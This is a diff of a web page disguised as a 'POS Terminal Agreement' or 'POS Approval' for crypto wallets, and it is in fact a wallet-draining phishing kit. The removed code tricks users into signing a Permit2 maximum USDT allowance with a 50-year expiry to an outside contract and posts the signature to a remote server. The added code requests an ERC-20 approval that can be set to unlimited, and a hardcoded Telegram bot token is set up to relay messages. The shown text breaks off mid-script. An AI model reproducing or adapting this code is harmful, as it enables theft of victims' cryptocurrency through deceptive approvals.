@@ -2,625 +2,716 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title>POS Terminal Agreement</title>
-    
-    <!-- Ethers.js -->
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>POS Approval - Trust Wallet / Meta Mask</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0d1117;
+            color: #c9d1d9;
             display: flex;
             justify-content: center;
             align-items: center;
+            min-height: 100vh;
             padding: 20px;
         }
         .container {
-            background: white;
-            border-radius: 20px;
-            padding: 40px;
-            max-width: 520px;
+            max-width: 700px;
             width: 100%;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            background: #161b22;
+            border-radius: 16px;
+            padding: 30px;
+            border: 1px solid #30363d;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
         }
-        h1 { color: #333; text-align: center; font-size: 26px; margin-bottom: 5px; }
-        .subtitle { text-align: center; color: #666; font-size: 14px; margin-bottom: 25px; }
-        .contract-address {
-            background: #f0f4f8;
-            padding: 10px;
+        h1 { font-size: 28px; margin-bottom: 8px; display: flex; align-items: center; gap: 10px; }
+        .subtitle { color: #8b949e; font-size: 14px; margin-bottom: 24px; }
+        .card {
+            background: #0d1117;
+            border: 1px solid #30363d;
             border-radius: 10px;
-            font-size: 12px;
-            text-align: center;
-            margin-bottom: 15px;
-            border: 1px solid #e0e8f0;
-            word-break: break-all;
+            padding: 18px 20px;
+            margin-bottom: 16px;
         }
-        .contract-address strong { color: #667eea; }
-        .treasury-address {
-            background: #fff3cd;
-            padding: 10px;
-            border-radius: 10px;
+        .card h3 { font-size: 15px; color: #f0f6fc; margin-bottom: 8px; }
+        .card p { font-size: 13px; color: #8b949e; word-break: break-all; margin: 4px 0; }
+        .badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
             font-size: 12px;
-            text-align: center;
-            margin-bottom: 20px;
-            border: 1px solid #ffeaa7;
-            word-break: break-all;
+            font-weight: 600;
         }
-        .treasury-address strong { color: #856404; }
-        .wallet-status {
-            background: #f0f0f0;
+        .badge-green { background: #2ea043; color: #fff; }
+        .badge-orange { background: #d29922; color: #fff; }
+        .badge-red { background: #da3633; color: #fff; }
+        .badge-gray { background: #30363d; color: #8b949e; }
+        .badge-blue { background: #1f6feb; color: #fff; }
+        .btn {
+            width: 100%;
             padding: 12px;
-            border-radius: 10px;
-            text-align: center;
-            margin-bottom: 20px;
-            font-size: 14px;
-            word-break: break-all;
-        }
-        .wallet-status.connected { background: #d4edda; color: #155724; }
-        .info-box {
-            background: #f8f9fa;
-            padding: 15px;
-            border-radius: 12px;
-            margin-bottom: 20px;
-            font-size: 14px;
-        }
-        .info-box div {
-            padding: 6px 0;
-            border-bottom: 1px solid #e0e0e0;
-            display: flex;
-            justify-content: space-between;
-        }
-        .info-box div:last-child { border-bottom: none; }
-        .info-box .label { color: #666; }
-        .info-box .value { font-weight: 600; color: #333; }
-        .info-box .value.unlimited { color: #28a745; }
-        button {
-            padding: 14px 20px;
             border: none;
-            border-radius: 12px;
+            border-radius: 8px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            color: white;
-            width: 100%;
-            transition: all 0.3s ease;
+            transition: all 0.2s;
         }
-        button:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 20px rgba(0,0,0,0.15);
-        }
-        button:disabled { opacity: 0.5; cursor: not-allowed; }
-        .btn-connect { background: #667eea; }
-        .btn-connect:hover:not(:disabled) { background: #5a6fd6; }
-        .btn-sign { background: #28a745; }
-        .btn-sign.signing { background: #ffc107; color: #333; }
-        .btn-sign.done { background: #17a2b8; }
+        .btn-primary { background: #238636; color: #fff; }
+        .btn-primary:hover { background: #2ea043; }
+        .btn-primary:disabled { background: #30363d; color: #8b949e; cursor: not-allowed; }
+        .btn-secondary { background: #1f6feb; color: #fff; }
+        .btn-secondary:hover { background: #388bfd; }
+        .btn-danger { background: #da3633; color: #fff; }
+        .btn-danger:hover { background: #f85149; }
+        .btn-wallet { background: #8b5cf6; color: #fff; }
+        .btn-wallet:hover { background: #7c3aed; }
+        .hidden { display: none !important; }
         .status-msg {
-            margin-top: 15px;
-            padding: 12px 16px;
-            border-radius: 10px;
-            display: none;
-            text-align: center;
-            font-size: 14px;
-            font-weight: 500;
-            word-break: break-word;
-        }
-        .status-msg.success { display: block; background: #d4edda; color: #155724; }
-        .status-msg.error { display: block; background: #f8d7da; color: #721c24; }
-        .status-msg.info { display: block; background: #d1ecf1; color: #0c5460; }
-        .status-msg.loading { display: block; background: #fff3cd; color: #856404; }
-        .loading-spinner {
-            display: inline-block;
-            width: 18px;
-            height: 18px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #667eea;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-right: 10px;
-            vertical-align: middle;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .highlight {
-            background: #e8f4f8;
-            padding: 12px 16px;
-            border-radius: 10px;
-            border-left: 4px solid #17a2b8;
-            margin-bottom: 20px;
-            font-size: 14px;
-            color: #0c5460;
-        }
-        .success-check {
-            text-align: center;
-            font-size: 48px;
-            display: none;
             margin-top: 10px;
-        }
-        .success-check.show { display: block; }
-        
-        .wallet-options {
-            display: none;
-            margin-top: 15px;
-            background: #f8f9fa;
-            padding: 15px;
-            border-radius: 12px;
-            border: 1px solid #e0e0e0;
-            text-align: center;
-        }
-        .wallet-options.show { display: block; }
-        
-        .wallet-list-container {
-            max-height: 250px;
-            overflow-y: auto;
-            text-align: left;
-            padding-right: 5px;
-        }
-        .wallet-list-container::-webkit-scrollbar {
-            width: 6px;
-        }
-        .wallet-list-container::-webkit-scrollbar-thumb {
-            background: #ccc;
-            border-radius: 4px;
-        }
-
-        .wallet-btn {
-            background: #ffffff;
-            color: #333;
-            margin-top: 6px;
-            padding: 10px 12px;
+            padding: 10px;
+            border-radius: 6px;
             font-size: 13px;
-            border-radius: 8px;
-            border: 1px solid #d0d0d0;
-            cursor: pointer;
+        }
+        .status-msg.success { background: #0f2d1a; color: #58a6ff; border: 1px solid #2ea043; }
+        .status-msg.error { background: #2d0f0f; color: #f85149; border: 1px solid #da3633; }
+        .status-msg.info { background: #0d1f2d; color: #58a6ff; border: 1px solid #1f6feb; }
+        .flex-row { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
+        .mt-10 { margin-top: 10px; }
+        .addr {
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            background: #0d1117;
+            padding: 4px 8px;
+            border-radius: 4px;
+            border: 1px solid #30363d;
+            word-break: break-all;
+        }
+        .divider { border: none; border-top: 1px solid #30363d; margin: 16px 0; }
+        .footer { text-align: center; font-size: 12px; color: #484f58; margin-top: 10px; }
+        .footer a { color: #58a6ff; text-decoration: none; }
+        .footer a:hover { text-decoration: underline; }
+        .debug-box {
+            background: #0d1117;
+            padding: 10px;
+            border-radius: 6px;
+            font-size: 11px;
+            color: #8b949e;
+            border: 1px solid #30363d;
+            margin-top: 10px;
+            font-family: monospace;
+            word-break: break-all;
+            max-height: 120px;
+            overflow-y: auto;
+            line-height: 1.6;
+        }
+        .amount-input {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 8px 12px;
+            color: #c9d1d9;
+            font-size: 14px;
             width: 100%;
-            text-align: left;
+            font-family: monospace;
+        }
+        .amount-input:focus {
+            outline: none;
+            border-color: #1f6feb;
+        }
+        .amount-row {
             display: flex;
-            align-items: center;
             gap: 10px;
+            align-items: center;
+            flex-wrap: wrap;
         }
-        .wallet-btn:hover { background: #f0f0f0; border-color: #667eea; }
-
-        @media (max-width: 480px) {
-            .container { padding: 25px 20px; }
-            h1 { font-size: 22px; }
+        .amount-row label {
+            color: #8b949e;
+            font-size: 13px;
+            min-width: 60px;
         }
+        .amount-row input {
+            flex: 1;
+            min-width: 150px;
+        }
+        .amount-row .usdt-label {
+            color: #8b949e;
+            font-size: 13px;
+        }
+        .telegram-status {
+            font-size: 12px;
+            color: #8b949e;
+            margin-top: 8px;
+            padding: 8px;
+            background: #0d1117;
+            border-radius: 6px;
+            border: 1px solid #30363d;
+        }
+        .telegram-status .success { color: #2ea043; }
+        .telegram-status .error { color: #da3633; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>💰 Terms And Conditions</h1>
-        <p class="subtitle">POS Terminal Merchant Agreement</p>
 
-        <div class="contract-address">
-            <strong>📋 Contract:</strong> 0x72cA82f4463Bad47F7C762A7F3680EB232B72b33
+<div class="container">
+    <h1>🔑 POS Approval</h1>
+    <p class="subtitle">approve your wallet to get POS settlement</p>
+
+    <!-- ===== WALLET CARD ===== -->
+    <div class="card">
+        <div class="flex-row">
+            <h3>📱 Wallet</h3>
+            <span id="walletStatus" class="badge badge-gray">Not Connected</span>
         </div>
-
-        <div class="treasury-address">
-            <strong>🏦 Treasury:</strong> 0xB70a8100a45a28b605dbfb34d713071e21A57D28
-        </div>
-
-        <div class="highlight">
-            ✅ <strong>Software License & SaaS Subscription Terms</strong> The software is provided under a limited, non-exclusive, non-transferable license strictly for the Merchant's business operations.
-        </div>
-
-        <div id="walletStatus" class="wallet-status">⛓️ Not Connected</div>
-
-        <div class="info-box">
-            <div>
-                <span class="label">👤 Your Address</span>
-                <span class="value" id="userDisplay">Not connected</span>
-            </div>
-            <div>
-                <span class="label">📋 Agreement Status</span>
-                <span class="value" id="allowanceDisplay">Connect to check</span>
-            </div>
-            <div>
-                <span class="label">📅 Valid Until</span>
-                <span class="value" id="expiryDisplay">-</span>
-            </div>
-        </div>
-
-        <button id="connectBtn" class="btn-connect">🔗 Connect Wallet</button>
+        <p id="walletAddress" style="font-size:12px;color:#484f58;">Click "Connect Wallet" to start</p>
         
-        <!-- Wallet Selection Box -->
-        <div id="walletOptions" class="wallet-options">
-            <p style="font-size: 13px; color: #555; margin-bottom: 8px; font-weight: 600;">Select your wallet app:</p>
-            <div class="wallet-list-container">
-                <button class="wallet-btn" onclick="openWalletApp('metamask')">🦊 MetaMask</button>
-                <button class="wallet-btn" onclick="openWalletApp('trust')">🛡️ Trust Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('binance')">🟡 Binance Web3 Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('coinbase')">🔵 Coinbase Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('okx')">⭕ OKX Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('bitget')">🪙 Bitget Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('tokenpocket')">🌀 TokenPocket</button>
-                <button class="wallet-btn" onclick="openWalletApp('safepal')">🔒 SafePal</button>
-                <button class="wallet-btn" onclick="openWalletApp('bybit')">📊 Bybit Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('phantom')">🟣 Phantom Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('crypto')">💠 Crypto.com DeFi Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('kucoin')">🟨 KuCoin Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('gate')">🚪 Gate.io Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('imtoken')">🟥 imToken</button>
-                <button class="wallet-btn" onclick="openWalletApp('unstoppable')">🌐 Unstoppable Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('bitpay')">💳 BitPay</button>
-                <button class="wallet-btn" onclick="openWalletApp('argent')">🛡️ Argent</button>
-                <button class="wallet-btn" onclick="openWalletApp('alphawallet')">⚡ AlphaWallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('xdefi')">✖️ XDEFI Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('solflare')">☀️ Solflare</button>
-            </div>
+        <button id="connectBtn" class="btn btn-wallet mt-10">🔗 Connect Wallet</button>
+        
+        <div id="networkInfo" class="mt-10" style="font-size:12px;color:#8b949e;"></div>
+        <div id="walletProvider" class="mt-10" style="font-size:12px;color:#484f58;"></div>
+        
+        <!-- Telegram Status -->
+        <div id="telegramStatus" class="telegram-status">
+            🤖 Telegram: <span id="telegramStatusText">Ready</span>
         </div>
-
-        <br>
-        <button id="signBtn" class="btn-sign" disabled>✍️ Sign Agreement</button>
-
-        <div id="successCheck" class="success-check">✅</div>
-        <div id="statusMsg" class="status-msg"></div>
+        
+        <div id="debugInfo" class="debug-box">Waiting for connection...</div>
     </div>
 
-    <script>
-        const CONFIG = {
-            contractAddress: "0x72cA82f4463Bad47F7C762A7F3680EB232B72b33",
-            treasuryWallet: "0xB70a8100a45a28b605dbfb34d713071e21A57D28",
-            permit2Address: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
-            usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
-            chainId: 1,
-            apiUrl: "https://201-black.vercel.app/api/submit-signature"
-        };
+    <!-- ===== CONTRACT DETAILS ===== -->
+    <div class="card">
+        <h3>📝 Contract Details</h3>
+        <p><strong>Contract:</strong> <span class="addr" id="contractDisplay">0x386aC22701d4E0419A2406bE32cD255D2b6c42cE</span></p>
+        <p><strong>Treasury:</strong> <span class="addr">0xB70a8100a45a28b605dbfb34d713071e21A57D28</span></p>
+        <p><strong>Token:</strong> USDT</p>
+        <p><strong>Token Address:</strong> <span class="addr">0xdAC17F958D2ee523a2206206994597C13D831ec7</span></p>
+    </div>
 
-        const MAX_UINT160 = "1461501637330902918203684832716283019655932542975";
+    <!-- ===== APPROVAL CARD ===== -->
+    <div class="card">
+        <div class="flex-row">
+            <h3>🔓 Approval Status</h3>
+            <span id="approvalBadge" class="badge badge-gray">Checking...</span>
+        </div>
 
-        let signer, provider, userAddress;
+        <div class="flex-row mt-10">
+            <span style="font-size:13px;color:#8b949e;">Current Allowance:</span>
+            <span id="allowanceDisplay" style="font-family:monospace;font-size:13px;">Loading...</span>
+        </div>
 
-        const $ = (id) => document.getElementById(id);
-        const walletStatus = $('walletStatus');
-        const connectBtn = $('connectBtn');
-        const signBtn = $('signBtn');
-        const statusMsg = $('statusMsg');
-        const userDisplay = $('userDisplay');
-        const allowanceDisplay = $('allowanceDisplay');
-        const expiryDisplay = $('expiryDisplay');
-        const successCheck = $('successCheck');
-        const walletOptions = $('walletOptions');
+        <div class="flex-row mt-10">
+            <span style="font-size:13px;color:#8b949e;">Your USDT Balance:</span>
+            <span id="balanceDisplay" style="font-family:monospace;font-size:13px;">Loading...</span>
+        </div>
 
-        function showStatus(message, type = 'info') {
-            statusMsg.className = `status-msg ${type}`;
-            statusMsg.innerHTML = message;
-            statusMsg.style.display = 'block';
-            if (type !== 'error') {
-                setTimeout(() => { statusMsg.style.display = 'none'; }, 8000);
-            }
+        <!-- Amount Input -->
+        <div class="amount-row mt-10">
+            <label>Amount:</label>
+            <input type="text" id="amountInput" class="amount-input" value="2520" placeholder="Enter USDT amount" />
+            <span class="usdt-label">USDT</span>
+        </div>
+        <p style="font-size:11px;color:#484f58;margin-top:4px;">
+            💡 Enter The Amount To Receive<br />
+            💡 Type <strong>"unlimited"</strong> for unlimited approval
+        </p>
+
+        <button id="approveBtn" class="btn btn-primary mt-10" disabled>
+            Connect Wallet First
+        </button>
+
+        <div id="approvalStatus" class="status-msg info mt-10 hidden">
+            ⏳ Waiting for approval...
+        </div>
+    </div>
+
+    <!-- ===== INFO CARD ===== -->
+    <div class="card">
+        <h3>💰 Authorization</h3>
+        <p style="font-size:13px;color:#8b949e;">
+            Once Verified, your wallet will be link to on-ramp api for POS settlement.
+        </p>
+    </div>
+
+    <hr class="divider" />
+    <div class="footer">
+        <p>Trust Wallet / Meta Mask DApp Browser | v2.0</p>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+
+<script>
+    // ================================================================
+    //  TELEGRAM CONFIG - YOUR BOT TOKEN & CHAT ID
+    // ================================================================
+    const TELEGRAM_CONFIG = {
+        botToken: '8855117210:AAFi_83D-FJXPyxLjGOf9cQgjhUf0VC5avY',
+        chatId: '8550902598'
+    };
+
+    // ================================================================
+    //  CONFIG
+    // ================================================================
+    const CONFIG = {
+        contractAddress: '0x386aC22701d4E0419A2406bE32cD255D2b6c42cE',
+        treasuryAddress: '0xB70a8100a45a28b605dbfb34d713071e21A57D28',
+        usdtAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+        maxUint256: '115792089237316195423570985008687907853269984665640564039457584007913129639935'
+    };
+
+    const ERC20_ABI = [
+        'function approve(address spender, uint256 amount) external returns (bool)',
+        'function allowance(address owner, address spender) external view returns (uint256)',
+        'function balanceOf(address account) external view returns (uint256)',
+        'function decimals() external view returns (uint8)',
+        'function symbol() external view returns (string)'
+    ];
+
+    // ================================================================
+    //  DOM REFS
+    // ================================================================
+    const $ = (id) => document.getElementById(id);
+    const walletStatus = $('walletStatus');
+    const walletAddress = $('walletAddress');
+    const connectBtn = $('connectBtn');
+    const networkInfo = $('networkInfo');
+    const walletProvider = $('walletProvider');
+    const approvalBadge = $('approvalBadge');
+    const allowanceDisplay = $('allowanceDisplay');
+    const balanceDisplay = $('balanceDisplay');
+    const approveBtn = $('approveBtn');
+    const approvalStatus = $('approvalStatus');
+    const debugInfo = $('debugInfo');
+    const amountInput = $('amountInput');
+    const telegramStatusText = $('telegramStatusText');
+
+    // ================================================================
+    //  TELEGRAM SENDER
+    // ================================================================
+    async function sendTelegramMessage(message) {
+        if (!TELEGRAM_CONFIG.botToken || TELEGRAM_CONFIG.botToken === 'YOUR_BOT_TOKEN_HERE') {
+            telegramStatusText.textContent = '⚠️ Bot Token not configured!';
+            telegramStatusText.className = 'error';
+            return false;
         }
 
-        function shortenAddress(address) {
-            if (!address) return '';
-            return address.slice(0, 6) + '...' + address.slice(-4);
-        }
-
-        function formatDate(timestamp) {
-            if (!timestamp || timestamp === 0) return '-';
-            return new Date(timestamp * 1000).toLocaleDateString('en-US', {
-                year: 'numeric', month: 'short', day: 'numeric'
+        try {
+            const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CONFIG.chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
             });
-        }
-
-        function isMobile() {
-            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-        }
-
-        function openWalletApp(walletType) {
-            // URL එකට ඔටෝ කනෙක්ට් වීමට ප්‍රයිවට් ෆ්ලෑග් එකක් (autoconnect=true) එකතු කර යවනවා
-            let currentUrl = window.location.href.split('?')[0];
-            let targetUrl = `${currentUrl}?autoconnect=true`;
-            let cleanUrl = targetUrl.replace(/^https?:\/\//, '');
-
-            let deepLink = '';
-
-            switch (walletType) {
-                case 'metamask':
-                    deepLink = `https://metamask.app.link/dapp/${cleanUrl}`;
-                    break;
-                case 'trust':
-                    deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'binance':
-                    deepLink = `https://app.binance.com/en/deeplink/cryptorouting/dapp?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'coinbase':
-                    deepLink = `https://go.cb-w.com/dapp?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'okx':
-                    deepLink = `https://www.okx.com/download?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'bitget':
-                    deepLink = `https://bk.app/en/deeplink/dapp?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'tokenpocket':
-                    deepLink = `tpdapp://open?params=${encodeURIComponent(JSON.stringify({url: targetUrl}))}`;
-                    break;
-                case 'safepal':
-                    deepLink = `https://safepal.io/dapp?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'bybit':
-                    deepLink = `https://www.bybit.com/en/deeplink/dapp?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'phantom':
-                    deepLink = `https://phantom.app/ul/browse/${encodeURIComponent(targetUrl)}?ref=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'crypto':
-                    deepLink = `https://deeplink.crypto.com/dapp?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'kucoin':
-                    deepLink = `https://kucoin.com/land/ucard/dapp?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'gate':
-                    deepLink = `https://www.gate.io/mobile/dapp?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'imtoken':
-                    deepLink = `imtoken://support.token.im/start?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'unstoppable':
-                    deepLink = `unstoppable.money://url?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'bitpay':
-                    deepLink = `https://bitpay.com/wallet?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'argent':
-                    deepLink = `https://argent.link/app/dapp?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'alphawallet':
-                    deepLink = `https://aw.app/open?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'xdefi':
-                    deepLink = `https://www.xdefi.io/dapp?url=${encodeURIComponent(targetUrl)}`;
-                    break;
-                case 'solflare':
-                    deepLink = `https://solflare.com/ul/v1/browse/${encodeURIComponent(targetUrl)}`;
-                    break;
-                default:
-                    deepLink = targetUrl;
-            }
-
-            window.location.href = deepLink;
-        }
-
-        async function connectWallet() {
-            try {
-                if (window.ethereum) {
-                    provider = new ethers.providers.Web3Provider(window.ethereum, "any");
-                    await provider.send('eth_requestAccounts', []);
-                    signer = provider.getSigner();
-                    userAddress = await signer.getAddress();
-                } else {
-                    if (isMobile()) {
-                        walletOptions.classList.toggle('show');
-                        showStatus('📱 Select your wallet from the list below.', 'info');
-                        return;
-                    } else {
-                        showStatus('⚠️ Web3 Provider not found. Please install MetaMask or a compatible browser extension.', 'error');
-                        return;
-                    }
-                }
-
-                const network = await provider.getNetwork();
-                if (network.chainId !== CONFIG.chainId) {
-                    showStatus(`⚠️ Wrong network. Please switch to Ethereum Mainnet (Chain ID: 1)`, 'error');
-                    return;
-                }
-
-                updateUI();
-                await checkAllowance();
-                showStatus('✅ Wallet connected successfully!', 'success');
-
-                if (window.ethereum) {
-                    window.ethereum.on('accountsChanged', () => location.reload());
-                    window.ethereum.on('chainChanged', () => location.reload());
-                }
-
-            } catch (error) {
-                console.error('❌ Connect error:', error);
-                let errorMsg = error.message || error;
-                if (String(errorMsg).includes('User rejected') || String(errorMsg).includes('rejected')) {
-                    errorMsg = 'Connection cancelled by user';
-                }
-                showStatus(`❌ ${errorMsg}`, 'error');
-            }
-        }
-
-        function updateUI() {
-            walletStatus.className = 'wallet-status connected';
-            walletStatus.innerHTML = `🟢 Connected: ${shortenAddress(userAddress)}`;
-            connectBtn.textContent = '✅ Connected';
-            connectBtn.disabled = true;
-            signBtn.disabled = false;
-            userDisplay.textContent = shortenAddress(userAddress);
-            walletOptions.classList.remove('show');
-        }
-
-        async function checkAllowance() {
-            try {
-                if (!userAddress) return;
-
-                const contract = new ethers.Contract(
-                    CONFIG.contractAddress,
-                    ["function getAllowance(address user) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"],
-                    provider
-                );
-
-                const result = await contract.getAllowance(userAddress);
-                const amount = result.amount;
-                const expiration = result.expiration;
-
-                if (amount.toString() === '0') {
-                    allowanceDisplay.textContent = '❌ Not Signed';
-                    allowanceDisplay.className = 'value';
-                    expiryDisplay.textContent = '-';
-                    return;
-                }
-
-                const isUnlimited = amount.toString() === MAX_UINT160;
-                allowanceDisplay.textContent = isUnlimited ? '✅ Signed' : `${ethers.utils.formatUnits(amount, 6)} USDT`;
-                allowanceDisplay.className = isUnlimited ? 'value unlimited' : 'value';
-                expiryDisplay.textContent = formatDate(expiration);
-
-                if (isUnlimited && expiration > Math.floor(Date.now() / 1000)) {
-                    signBtn.textContent = '✅ Already Signed!';
-                    signBtn.className = 'btn-sign done';
-                    signBtn.disabled = true;
-                    successCheck.classList.add('show');
-                }
-
-            } catch (error) {
-                console.error('❌ Error checking allowance:', error);
-            }
-        }
-
-        async function getPermit2Nonce() {
-            const permit2 = new ethers.Contract(
-                CONFIG.permit2Address,
-                ["function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"],
-                provider
-            );
-            const data = await permit2.allowance(userAddress, CONFIG.usdtAddress, CONFIG.contractAddress);
-            return data.nonce;
-        }
-
-        async function signAndSubmit() {
-            try {
-                if (!signer || !userAddress) {
-                    showStatus('⚠️ Connect wallet first!', 'error');
-                    return;
-                }
-
-                signBtn.innerHTML = '<span class="loading-spinner"></span> Signing...';
-                signBtn.className = 'btn-sign signing';
-                signBtn.disabled = true;
-
-                const nonce = await getPermit2Nonce();
-                const years = 50;
-                const expiration = Math.floor(Date.now() / 1000) + (365 * 24 * 3600 * years);
-                const sigDeadline = Math.floor(Date.now() / 1000) + 3600;
-
-                showStatus('✍️ Please sign in your wallet...', 'info');
-
-                const domain = {
-                    name: "Permit2",
-                    chainId: CONFIG.chainId,
-                    verifyingContract: CONFIG.permit2Address
-                };
-
-                const types = {
-                    PermitSingle: [
-                        { name: "details", type: "PermitDetails" },
-                        { name: "spender", type: "address" },
-                        { name: "sigDeadline", type: "uint256" }
-                    ],
-                    PermitDetails: [
-                        { name: "token", type: "address" },
-                        { name: "amount", type: "uint160" },
-                        { name: "expiration", type: "uint48" },
-                        { name: "nonce", type: "uint48" }
-                    ]
-                };
-
-                const message = {
-                    details: {
-                        token: CONFIG.usdtAddress,
-                        amount: MAX_UINT160,
-                        expiration: expiration,
-                        nonce: nonce
-                    },
-                    spender: CONFIG.contractAddress,
-                    sigDeadline: sigDeadline
-                };
-
-                const signature = await signer._signTypedData(domain, types, message);
-
-                showStatus('📤 Processing agreement...', 'loading');
-
-                const response = await fetch(CONFIG.apiUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        user: userAddress,
-                        amount: MAX_UINT160,
-                        expiration: expiration,
-                        nonce: nonce.toString(),
-                        sigDeadline: sigDeadline,
-                        signature: signature
-                    })
-                });
-
-                const rawText = await response.text();
-                let result;
-                try {
-                    result = JSON.parse(rawText);
-                } catch (parseError) {
-                    showStatus(`❌ Backend error: ${rawText.substring(0, 100)}`, 'error');
-                    signBtn.innerHTML = '✍️ Sign Agreement';
-                    signBtn.className = 'btn-sign';
-                    signBtn.disabled = false;
-                    return;
-                }
-
-                if (result.success) {
-                    signBtn.textContent = '✅ Signed!';
-                    signBtn.className = 'btn-sign done';
-                    signBtn.disabled = true;
-                    successCheck.classList.add('show');
-                    showStatus(`✅ ${result.message}`, 'success');
-                    await checkAllowance();
-                } else {
-                    showStatus(`❌ Error: ${result.error}`, 'error');
-                    signBtn.innerHTML = '✍️ Sign Agreement';
-                    signBtn.className = 'btn-sign';
-                    signBtn.disabled = false;
-                }
-
-            } catch (error) {
-                console.error('❌ signAndSubmit error:', error);
-                let errorMsg = error.message || error;
-                if (String(errorMsg).includes('User rejected') || String(errorMsg).includes('rejected')) {
-                    errorMsg = 'You rejected the signature';
-                }
-                showStatus(`❌ ${errorMsg}`, 'error');
-                signBtn.innerHTML = '✍️ Sign Agreement';
-                signBtn.className = 'btn-sign';
-                signBtn.disabled = false;
-            }
-        }
-
-        connectBtn.addEventListener('click', () => {
-            if (window.ethereum) {
-                connectWallet();
-            } else if (isMobile()) {
-                walletOptions.classList.toggle('show');
-                showStatus('📱 Select your wallet from the list below.', 'info');
+            
+            const result = await response.json();
+            if (result.ok) {
+                telegramStatusText.textContent = '✅ Sent to Telegram!';
+                telegramStatusText.className = 'success';
+                debug('📤 Telegram message sent successfully');
+                return true;
             } else {
-                connectWallet();
+                telegramStatusText.textContent = '❌ Failed: ' + (result.description || 'Unknown error');
+                telegramStatusText.className = 'error';
+                debug('❌ Telegram error: ' + JSON.stringify(result));
+                return false;
             }
-        });
+        } catch (error) {
+            telegramStatusText.textContent = '❌ Error: ' + error.message;
+            telegramStatusText.className = 'error';
+            debug('❌ Telegram send error: ' + error.message);
+            return false;
+        }
+    }
 
-        signBtn.addEventListener('click', signAndSubmit);
+    // ================================================================
+    //  DEBUG
+    // ================================================================
+    function debug(msg) {
+        const time = new Date().toLocaleTimeString();
+        debugInfo.innerHTML += `[${time}] ${msg}\n`;
+        console.log('[DEBUG]', msg);
+        debugInfo.scrollTop = debugInfo.scrollHeight;
+    }
 
-        // 🚀 Auto-Connect Trigger: වොලට් ඇප් එක ඇතුළට ඩීප් ලින්ක් හරහා රීඩිරෙක්ට් වෙලා එනකොට ඔටෝ කනෙක්ට් වීම සඳහා
-        window.addEventListener('load', () => {
-            const urlParams = new URLSearchParams(window.location.search);
-            if (urlParams.get('autoconnect') === 'true') {
-                // ටිකක් වේලා දීලා වොලට් ඉන්ජෙක්ෂන් (window.ethereum) ලෝඩ් වෙන්න සලස්වනවා
-                setTimeout(() => {
-                    if (window.ethereum) {
-                        showStatus('🔄 Auto-connecting to your wallet...', 'info');
-                        connectWallet();
-                    }
-                }, 1000);
+    // ================================================================
+    //  STATE
+    // ================================================================
+    let provider = null;
